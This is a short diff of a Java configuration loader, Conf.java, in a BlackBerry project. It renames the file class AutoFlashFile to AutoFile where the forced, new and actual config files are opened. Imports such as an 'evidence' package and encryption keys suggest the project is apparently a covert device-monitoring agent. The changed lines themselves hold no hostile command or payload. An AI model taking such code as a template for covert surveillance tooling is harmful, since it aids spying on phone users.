@@ -25,7 +25,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.Evidence;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
 import blackberry.params.Parameter;
 import blackberry.utils.Check;
@@ -200,10 +200,10 @@ public final class Conf {
         debug.trace("load: " + Encryption.getKeys().log);
         //#endif
 
-        AutoFlashFile file;
+        AutoFile file;
 
         //#ifdef DEBUG
-        file = new AutoFlashFile(Path.SD() + Path.CONF_DIR + Conf.FORCED_CONF,
+        file = new AutoFile(Path.SD() + Path.CONF_DIR + Conf.FORCED_CONF,
                 true);
         if (file.exists()) {
             debug.info("Try: forced config");
@@ -221,7 +221,7 @@ public final class Conf {
         }
         //#endif
 
-        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF,
+        file = new AutoFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF,
                 true);
         if (file.exists()) {
             //#ifdef DEBUG
@@ -246,7 +246,7 @@ public final class Conf {
             }
         }
 
-        file = new AutoFlashFile(
+        file = new AutoFile(
                 Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
